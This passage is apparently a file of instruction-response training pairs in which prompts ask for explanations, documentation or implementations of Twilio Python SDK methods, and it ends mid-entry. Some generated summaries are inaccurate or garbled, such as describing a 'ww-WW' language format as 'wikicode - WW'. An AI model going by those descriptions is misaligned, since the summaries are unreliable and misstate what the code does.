{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef sync_list_items(self):\n        if self._sync_list_items is None:\n            self._sync_list_items = SyncListItemList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                list_sid=self._solution['sid'],\n            )\n        return self._sync_list_items", "response": "Access the sync_list_items\n\n        :returns: twilio.rest.sync.v1.service.sync_list.sync_list_item.SyncListItemList\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_item.SyncListItemList"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef sync_list_permissions(self):\n        if self._sync_list_permissions is None:\n            self._sync_list_permissions = SyncListPermissionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                list_sid=self._solution['sid'],\n            )\n        return self._sync_list_permissions", "response": "Access the sync_list_permissions\n\n        :returns: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionList\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_permission.SyncListPermissionList"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SyncListContext for this SyncListInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListContext\n        \"\"\"\n        if self._context is None:\n            self._context = SyncListContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, unique_name=values.unset, callback_method=values.unset,\n               callback_url=values.unset, friendly_name=values.unset,\n               rate_plan=values.unset, status=values.unset,\n               commands_callback_method=values.unset,\n               commands_callback_url=values.unset, sms_fallback_method=values.unset,\n               sms_fallback_url=values.unset, sms_method=values.unset,\n               sms_url=values.unset, voice_fallback_method=values.unset,\n               voice_fallback_url=values.unset, voice_method=values.unset,\n               voice_url=values.unset, reset_status=values.unset):\n        \"\"\"\n        Update the SimInstance\n\n        :param unicode unique_name: A user-provided string that uniquely identifies this resource as an alternative to the Sid.\n        :param unicode callback_method: The HTTP method Twilio will use when making a request to the callback URL.\n        :param unicode callback_url: Twilio will make a request to this URL when the Sim has finished updating.\n        :param unicode friendly_name: A user-provided string that identifies this resource.\n        :param unicode rate_plan: The Sid or UniqueName of the RatePlan that this Sim should use.\n        :param SimInstance.Status status: A string representing the status of the Sim.\n        :param unicode commands_callback_method: A string representing the HTTP method to use when making a request to CommandsCallbackUrl.\n        :param unicode commands_callback_url: The URL that will receive a webhook when this Sim originates a Command.\n        :param unicode sms_fallback_method: The HTTP method Twilio will use when requesting the sms_fallback_url.\n        :param unicode sms_fallback_url: The URL that Twilio will request if an error occurs retrieving or executing the TwiML requested by sms_url.\n        :param unicode sms_method: The HTTP method Twilio will use when requesting the above Url.\n        :param unicode sms_url: The URL Twilio will request when the SIM-connected device sends an SMS message that is not a Command.\n        :param unicode voice_fallback_method: The HTTP method Twilio will use when requesting the voice_fallback_url.\n        :param unicode voice_fallback_url: The URL that Twilio will request if an error occurs retrieving or executing the TwiML requested by voice_url.\n        :param unicode voice_method: The HTTP method Twilio will use when requesting the above Url.\n        :param unicode voice_url: The URL Twilio will request when the SIM-connected device makes a call.\n        :param SimInstance.ResetStatus reset_status: Initiate a connectivity reset on a Sim.\n\n        :returns: Updated SimInstance\n        :rtype: twilio.rest.wireless.v1.sim.SimInstance\n        \"\"\"\n        data = values.of({\n            'UniqueName': unique_name,\n            'CallbackMethod': callback_method,\n            'CallbackUrl': callback_url,\n            'FriendlyName': friendly_name,\n            'RatePlan': rate_plan,\n            'Status': status,\n            'CommandsCallbackMethod': commands_callback_method,\n            'CommandsCallbackUrl': commands_callback_url,\n            'SmsFallbackMethod': sms_fallback_method,\n            'SmsFallbackUrl': sms_fallback_url,\n            'SmsMethod': sms_method,\n            'SmsUrl': sms_url,\n            'VoiceFallbackMethod': voice_fallback_method,\n            'VoiceFallbackUrl': voice_fallback_url,\n            'VoiceMethod': voice_method,\n            'VoiceUrl': voice_url,\n            'ResetStatus': reset_status,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SimInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the SimInstance s Information"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef usage_records(self):\n        if self._usage_records is None:\n            self._usage_records = UsageRecordList(self._version, sim_sid=self._solution['sid'], )\n        return self._usage_records", "response": "Access the usage_records\n\n        :returns: twilio.rest.wireless.v1.sim.usage_record.UsageRecordList\n        :rtype: twilio.rest.wireless.v1.sim.usage_record.UsageRecordList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the data_sessions :returns: twilio.rest.wireless.v1.sim.data_session.DataSessionList :rtype: twilio.rest.wireless.v1.sim.data_session.DataSessionList", "response": "def data_sessions(self):\n        \"\"\"\n        Access the data_sessions\n\n        :returns: twilio.rest.wireless.v1.sim.data_session.DataSessionList\n        :rtype: twilio.rest.wireless.v1.sim.data_session.DataSessionList\n        \"\"\"\n        if self._data_sessions is None:\n            self._data_sessions = DataSessionList(self._version, sim_sid=self._solution['sid'], )\n        return self._data_sessions"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the Workspaces Twilio Domain", "response": "def workspaces(self):\n        \"\"\"\n        :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceList\n        \"\"\"\n        if self._workspaces is None:\n            self._workspaces = WorkspaceList(self)\n        return self._workspaces"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a new DeploymentInstance", "response": "def create(self, friendly_name=values.unset, sync_service_sid=values.unset):\n        \"\"\"\n        Create a new DeploymentInstance\n\n        :param unicode friendly_name: A human readable description for this Deployment.\n        :param unicode sync_service_sid: The unique identifier of the Sync service instance.\n\n        :returns: Newly created DeploymentInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentInstance\n        \"\"\"\n        data = values.of({'FriendlyName': friendly_name, 'SyncServiceSid': sync_service_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DeploymentInstance(self._version, payload, fleet_sid=self._solution['fleet_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a DeploymentContext :param sid: A string that uniquely identifies the Deployment. :returns: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentContext :rtype: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a DeploymentContext\n\n        :param sid: A string that uniquely identifies the Deployment.\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentContext\n        :rtype: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentContext\n        \"\"\"\n        return DeploymentContext(self._version, fleet_sid=self._solution['fleet_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_instance(self, payload):\n        return DeploymentInstance(self._version, payload, fleet_sid=self._solution['fleet_sid'], )", "response": "Build an instance of DeploymentInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = DeploymentContext(\n                self._version,\n                fleet_sid=self._solution['fleet_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the DeploymentInstance :param unicode friendly_name: A human readable description for this Deployment. :param unicode sync_service_sid: The unique identifier of the Sync service instance. :returns: Updated DeploymentInstance :rtype: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentInstance", "response": "def update(self, friendly_name=values.unset, sync_service_sid=values.unset):\n        \"\"\"\n        Update the DeploymentInstance\n\n        :param unicode friendly_name: A human readable description for this Deployment.\n        :param unicode sync_service_sid: The unique identifier of the Sync service instance.\n\n        :returns: Updated DeploymentInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentInstance\n        \"\"\"\n        return self._proxy.update(friendly_name=friendly_name, sync_service_sid=sync_service_sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self):\n        return StepContextContext(\n            self._version,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n            step_sid=self._solution['step_sid'],\n        )", "response": "Constructs a StepContextContext\n\n        :returns: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextContext\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of StepContextInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of StepContextInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextInstance\n        \"\"\"\n        return StepContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n            step_sid=self._solution['step_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return StepContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n            step_sid=self._solution['step_sid'],\n        )", "response": "Fetch a StepContextInstance\n\n        :returns: Fetched StepContextInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = StepContextContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                engagement_sid=self._solution['engagement_sid'],\n                step_sid=self._solution['step_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nformatting the language parameter as wikicode - WW.", "response": "def format_language(language):\n    \"\"\"\n    Attempt to format language parameter as 'ww-WW'.\n\n    :param string language: language parameter\n    \"\"\"\n    if not language:\n        return language\n\n    if not re.match('^[a-zA-Z]{2}[_-][a-zA-Z]{2}$', language):\n        raise TwiMLException('Invalid value for language parameter.')\n\n    return language[0:2].lower() + '-' + language[3:5].upper()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef to_xml(self, xml_declaration=True):\n        xml = ET.tostring(self.xml()).decode('utf-8')\n        return '<?xml version=\"1.0\" encoding=\"UTF-8\"?>{}'.format(xml) if xml_declaration else xml", "response": "Return the contents of this verb as an XML string."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding a TwiML document to the list of verbs.", "response": "def nest(self, verb):\n        \"\"\"\n        Add a TwiML doc. Unlike `append()`, this returns the created verb.\n\n        :param verb: TwiML Document\n\n        :returns: the TwiML verb\n        \"\"\"\n        if not isinstance(verb, TwiML) and not isinstance(verb, str):\n            raise TwiMLException('Only nesting of TwiML and strings are allowed')\n\n        self.verbs.append(verb)\n        return verb"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new MessageInstance", "response": "def create(self, body, from_=values.unset, attributes=values.unset):\n        \"\"\"\n        Create a new MessageInstance\n\n        :param unicode body: The body\n        :param unicode from_: The from\n        :param unicode attributes: The attributes\n\n        :returns: Newly created MessageInstance\n        :rtype: twilio.rest.chat.v1.service.channel.message.MessageInstance\n        \"\"\"\n        data = values.of({'Body': body, 'From': from_, 'Attributes': attributes, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the MessageInstance :param unicode body: The new message body string. :param unicode attributes: The new attributes metadata field you can use to store any data you wish. :returns: Updated MessageInstance :rtype: twilio.rest.chat.v1.service.channel.message.MessageInstance", "response": "def update(self, body=values.unset, attributes=values.unset):\n        \"\"\"\n        Update the MessageInstance\n\n        :param unicode body: The new message body string.\n        :param unicode attributes: The new attributes metadata field you can use to store any data you wish.\n\n        :returns: Updated MessageInstance\n        :rtype: twilio.rest.chat.v1.service.channel.message.MessageInstance\n        \"\"\"\n        data = values.of({'Body': body, 'Attributes': attributes, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nupdating the MessageInstance with the given body and attributes.", "response": "def update(self, body=values.unset, attributes=values.unset):\n        \"\"\"\n        Update the MessageInstance\n\n        :param unicode body: The new message body string.\n        :param unicode attributes: The new attributes metadata field you can use to store any data you wish.\n\n        :returns: Updated MessageInstance\n        :rtype: twilio.rest.chat.v1.service.channel.message.MessageInstance\n        \"\"\"\n        return self._proxy.update(body=body, attributes=attributes, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild an instance of TodayInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TodayInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.today.TodayInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.today.TodayInstance\n        \"\"\"\n        return TodayInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return AssistantFallbackActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n        )", "response": "Build an instance of AssistantFallbackActionsInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, fallback_actions=values.unset):\n        data = values.of({'FallbackActions': serialize.object(fallback_actions), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AssistantFallbackActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n        )", "response": "Update the AssistantFallbackActionsInstance\n\n        :param dict fallback_actions: The fallback_actions\n\n        :returns: Updated AssistantFallbackActionsInstance\n        :rtype: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = AssistantFallbackActionsContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the assistant_fallback_actions"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the AssistantFallbackActionsInstance :param dict fallback_actions: The fallback_actions :returns: Updated AssistantFallbackActionsInstance :rtype: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsInstance", "response": "def update(self, fallback_actions=values.unset):\n        \"\"\"\n        Update the AssistantFallbackActionsInstance\n\n        :param dict fallback_actions: The fallback_actions\n\n        :returns: Updated AssistantFallbackActionsInstance\n        :rtype: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsInstance\n        \"\"\"\n        return self._proxy.update(fallback_actions=fallback_actions, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef receive(self, action=None, method=None, **kwargs):\n        return self.nest(Receive(action=action, method=method, **kwargs))", "response": "Create a Receive element based on action and method."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, webhook_method=values.unset, webhook_filters=values.unset,\n               pre_webhook_url=values.unset, post_webhook_url=values.unset,\n               pre_webhook_retry_count=values.unset,\n               post_webhook_retry_count=values.unset, target=values.unset):\n        \"\"\"\n        Update the WebhookInstance\n\n        :param unicode webhook_method: The HTTP method to be used when sending a webhook request.\n        :param unicode webhook_filters: The list of webhook event triggers that are enabled for this Service.\n        :param unicode pre_webhook_url: The absolute url the pre-event webhook request should be sent to.\n        :param unicode post_webhook_url: The absolute url the post-event webhook request should be sent to.\n        :param unicode pre_webhook_retry_count: The number of retries in case of pre-event webhook request failures.\n        :param unicode post_webhook_retry_count: The number of retries in case of post-event webhook request failures.\n        :param WebhookInstance.Target target: The routing target of the webhook.\n\n        :returns: Updated WebhookInstance\n        :rtype: twilio.rest.messaging.v1.webhook.WebhookInstance\n        \"\"\"\n        data = values.of({\n            'WebhookMethod': webhook_method,\n            'WebhookFilters': serialize.map(webhook_filters, lambda e: e),\n            'PreWebhookUrl': pre_webhook_url,\n            'PostWebhookUrl': post_webhook_url,\n            'PreWebhookRetryCount': pre_webhook_retry_count,\n            'PostWebhookRetryCount': post_webhook_retry_count,\n            'Target': target,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WebhookInstance(self._version, payload, )", "response": "Update the WebhookInstance\n\n        :param unicode webhook_method: The HTTP method to be used when sending a webhook request.\n        :param unicode webhook_filters: The list of webhook event triggers that are enabled for this Service.\n        :param unicode pre_webhook_url: The absolute url the pre-event webhook request should be sent to.\n        :param unicode post_webhook_url: The absolute url the post-event webhook request should be sent to.\n        :param unicode pre_webhook_retry_count: The number of retries in case of pre-event webhook request failures.\n        :param unicode post_webhook_retry_count: The number of retries in case of post-event webhook request failures.\n        :param WebhookInstance.Target target: The routing target of the webhook.\n\n        :returns: Updated WebhookInstance\n        :rtype: twilio.rest.messaging.v1.webhook.WebhookInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an instance context for the webhook instance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WebhookContext for this WebhookInstance\n        :rtype: twilio.rest.messaging.v1.webhook.WebhookContext\n        \"\"\"\n        if self._context is None:\n            self._context = WebhookContext(self._version, )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the WebhookInstance :param unicode webhook_method: The HTTP method to be used when sending a webhook request. :param unicode webhook_filters: The list of webhook event triggers that are enabled for this Service. :param unicode pre_webhook_url: The absolute url the pre-event webhook request should be sent to. :param unicode post_webhook_url: The absolute url the post-event webhook request should be sent to. :param unicode pre_webhook_retry_count: The number of retries in case of pre-event webhook request failures. :param unicode post_webhook_retry_count: The number of retries in case of post-event webhook request failures. :param WebhookInstance.Target target: The routing target of the webhook. :returns: Updated WebhookInstance :rtype: twilio.rest.messaging.v1.webhook.WebhookInstance", "response": "def update(self, webhook_method=values.unset, webhook_filters=values.unset,\n               pre_webhook_url=values.unset, post_webhook_url=values.unset,\n               pre_webhook_retry_count=values.unset,\n               post_webhook_retry_count=values.unset, target=values.unset):\n        \"\"\"\n        Update the WebhookInstance\n\n        :param unicode webhook_method: The HTTP method to be used when sending a webhook request.\n        :param unicode webhook_filters: The list of webhook event triggers that are enabled for this Service.\n        :param unicode pre_webhook_url: The absolute url the pre-event webhook request should be sent to.\n        :param unicode post_webhook_url: The absolute url the post-event webhook request should be sent to.\n        :param unicode pre_webhook_retry_count: The number of retries in case of pre-event webhook request failures.\n        :param unicode post_webhook_retry_count: The number of retries in case of post-event webhook request failures.\n        :param WebhookInstance.Target target: The routing target of the webhook.\n\n        :returns: Updated WebhookInstance\n        :rtype: twilio.rest.messaging.v1.webhook.WebhookInstance\n        \"\"\"\n        return self._proxy.update(\n            webhook_method=webhook_method,\n            webhook_filters=webhook_filters,\n            pre_webhook_url=pre_webhook_url,\n            post_webhook_url=post_webhook_url,\n            pre_webhook_retry_count=pre_webhook_retry_count,\n            post_webhook_retry_count=post_webhook_retry_count,\n            target=target,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of NewSigningKeyInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of NewSigningKeyInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.new_signing_key.NewSigningKeyInstance\n        :rtype: twilio.rest.api.v2010.account.new_signing_key.NewSigningKeyInstance\n        \"\"\"\n        return NewSigningKeyInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a ConnectAppContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.connect_app.ConnectAppContext :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ConnectAppContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.connect_app.ConnectAppContext\n        :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppContext\n        \"\"\"\n        return ConnectAppContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an instance of ConnectAppInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ConnectAppInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.connect_app.ConnectAppInstance\n        :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppInstance\n        \"\"\"\n        return ConnectAppInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the ConnectAppInstance :param unicode authorize_redirect_url: The URL to redirect the user to after authorization :param unicode company_name: The company name to set for the Connect App :param unicode deauthorize_callback_method: The HTTP method to use when calling deauthorize_callback_url :param unicode deauthorize_callback_url: The URL to call to de-authorize the Connect App :param unicode description: A description of the Connect App :param unicode friendly_name: A string to describe the resource :param unicode homepage_url: A public URL where users can obtain more information :param ConnectAppInstance.Permission permissions: The set of permissions that your ConnectApp will request :returns: Updated ConnectAppInstance :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppInstance", "response": "def update(self, authorize_redirect_url=values.unset, company_name=values.unset,\n               deauthorize_callback_method=values.unset,\n               deauthorize_callback_url=values.unset, description=values.unset,\n               friendly_name=values.unset, homepage_url=values.unset,\n               permissions=values.unset):\n        \"\"\"\n        Update the ConnectAppInstance\n\n        :param unicode authorize_redirect_url: The URL to redirect the user to after authorization\n        :param unicode company_name: The company name to set for the Connect App\n        :param unicode deauthorize_callback_method: The HTTP method to use when calling deauthorize_callback_url\n        :param unicode deauthorize_callback_url: The URL to call to de-authorize the Connect App\n        :param unicode description: A description of the Connect App\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode homepage_url: A public URL where users can obtain more information\n        :param ConnectAppInstance.Permission permissions: The set of permissions that your ConnectApp will request\n\n        :returns: Updated ConnectAppInstance\n        :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppInstance\n        \"\"\"\n        data = values.of({\n            'AuthorizeRedirectUrl': authorize_redirect_url,\n            'CompanyName': company_name,\n            'DeauthorizeCallbackMethod': deauthorize_callback_method,\n            'DeauthorizeCallbackUrl': deauthorize_callback_url,\n            'Description': description,\n            'FriendlyName': friendly_name,\n            'HomepageUrl': homepage_url,\n            'Permissions': serialize.map(permissions, lambda e: e),\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ConnectAppInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates an instance context for the availabilty of a resource.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ConnectAppContext for this ConnectAppInstance\n        :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppContext\n        \"\"\"\n        if self._context is None:\n            self._context = ConnectAppContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, authorize_redirect_url=values.unset, company_name=values.unset,\n               deauthorize_callback_method=values.unset,\n               deauthorize_callback_url=values.unset, description=values.unset,\n               friendly_name=values.unset, homepage_url=values.unset,\n               permissions=values.unset):\n        \"\"\"\n        Update the ConnectAppInstance\n\n        :param unicode authorize_redirect_url: The URL to redirect the user to after authorization\n        :param unicode company_name: The company name to set for the Connect App\n        :param unicode deauthorize_callback_method: The HTTP method to use when calling deauthorize_callback_url\n        :param unicode deauthorize_callback_url: The URL to call to de-authorize the Connect App\n        :param unicode description: A description of the Connect App\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode homepage_url: A public URL where users can obtain more information\n        :param ConnectAppInstance.Permission permissions: The set of permissions that your ConnectApp will request\n\n        :returns: Updated ConnectAppInstance\n        :rtype: twilio.rest.api.v2010.account.connect_app.ConnectAppInstance\n        \"\"\"\n        return self._proxy.update(\n            authorize_redirect_url=authorize_redirect_url,\n            company_name=company_name,\n            deauthorize_callback_method=deauthorize_callback_method,\n            deauthorize_callback_url=deauthorize_callback_url,\n            description=description,\n            friendly_name=friendly_name,\n            homepage_url=homepage_url,\n            permissions=permissions,\n        )", "response": "Update the ConnectAppInstance s Information"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a new FieldValueInstance", "response": "def create(self, language, value, synonym_of=values.unset):\n        \"\"\"\n        Create a new FieldValueInstance\n\n        :param unicode language: The ISO language-country tag that identifies the language of the value\n        :param unicode value: The Field Value data\n        :param unicode synonym_of: The string value that indicates which word the field value is a synonym of\n\n        :returns: Newly created FieldValueInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueInstance\n        \"\"\"\n        data = values.of({'Language': language, 'Value': value, 'SynonymOf': synonym_of, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FieldValueInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            field_type_sid=self._solution['field_type_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a FieldValueContext :param sid: The unique string that identifies the resource :returns: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueContext :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a FieldValueContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueContext\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueContext\n        \"\"\"\n        return FieldValueContext(\n            self._version,\n            assistant_sid=self._solution['assistant_sid'],\n            field_type_sid=self._solution['field_type_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_instance(self, payload):\n        return FieldValueInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            field_type_sid=self._solution['field_type_sid'],\n        )", "response": "Build an instance of FieldValueInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nfetch a FieldValueInstance :returns: Fetched FieldValueInstance :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a FieldValueInstance\n\n        :returns: Fetched FieldValueInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return FieldValueInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            field_type_sid=self._solution['field_type_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = FieldValueContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                field_type_sid=self._solution['field_type_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the availage field value"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, unique_name=values.unset, friendly_name=values.unset,\n               data_enabled=values.unset, data_limit=values.unset,\n               data_metering=values.unset, messaging_enabled=values.unset,\n               voice_enabled=values.unset, national_roaming_enabled=values.unset,\n               international_roaming=values.unset,\n               national_roaming_data_limit=values.unset,\n               international_roaming_data_limit=values.unset):\n        \"\"\"\n        Create a new RatePlanInstance\n\n        :param unicode unique_name: A user-provided string that uniquely identifies this resource as an alternative to the Sid.\n        :param unicode friendly_name: A user-provided string that identifies this resource.\n        :param bool data_enabled: Defines whether SIMs are capable of using GPRS/3G/LTE data connectivity.\n        :param unicode data_limit: Network-enforced limit specifying the total Megabytes of data usage allowed during one month on the home network.\n        :param unicode data_metering: The model by which to meter data usage, in accordance with the two available data metering models.\n        :param bool messaging_enabled: Defines whether SIMs are capable of making and sending and receiving SMS messages via either Commands or Programmable SMS APIs.\n        :param bool voice_enabled: Defines whether SIMs are capable of making and receiving voice calls.\n        